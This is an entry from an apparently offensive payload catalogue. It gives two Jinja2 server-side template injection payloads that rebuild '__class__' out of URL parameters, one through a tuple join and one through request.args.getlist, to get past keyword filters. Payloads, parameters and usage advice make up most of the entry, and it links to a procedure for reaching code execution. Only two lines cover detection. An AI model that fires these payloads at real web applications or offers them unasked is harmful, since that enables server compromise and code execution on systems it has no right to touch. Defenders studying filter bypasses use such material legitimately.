---
id: 292346e8-34bb-481c-a3ae-af222edaaa2e
type: code
language: python
verified: true
created_at: '2023-04-06T03:56:39.901624+00:00'
updated_at: '2023-04-10T20:23:43.898447+00:00'
platforms:
  - Web
tags:
  - jinja2
  - ssti
  - filter-bypass
validated: true
---

# alternative-jinja2-bypass-using-getlist

## Code

```python
http://localhost:5000/?exploit={{request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)}}&class=class&usc=_ 
or
http://localhost:5000/?exploit={{request|attr(request.args.getlist(request.args.l)|join)}}&l=a&a=_&a=_&a=class&a=_&a=_ 
```

## Description

Alternative payloads using tuple join or request.args.getlist() to construct '__class__' from multiple parameters, evading list-specific filters in Jinja2.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $TARGET_URL | Vulnerable endpoint | http://localhost:5000/ |
| usc | Underscore param | _ |
| class | Class string param | class |
| l | List key for getlist | a |
| a | Repeated values for list | _, _, class, _, _ |

## Usage

Use when list join is filtered; getlist pulls array from repeated 'a' params. Embed in requests to access __class__.

## Detection

- Requests with repeated params (e.g., multiple &a=_).
- Jinja2 logs showing getlist or tuple join in expressions.

## Related

- [[procedures/Bypass-Jinja2-Filters-for-SSTI-Code-Execution]]
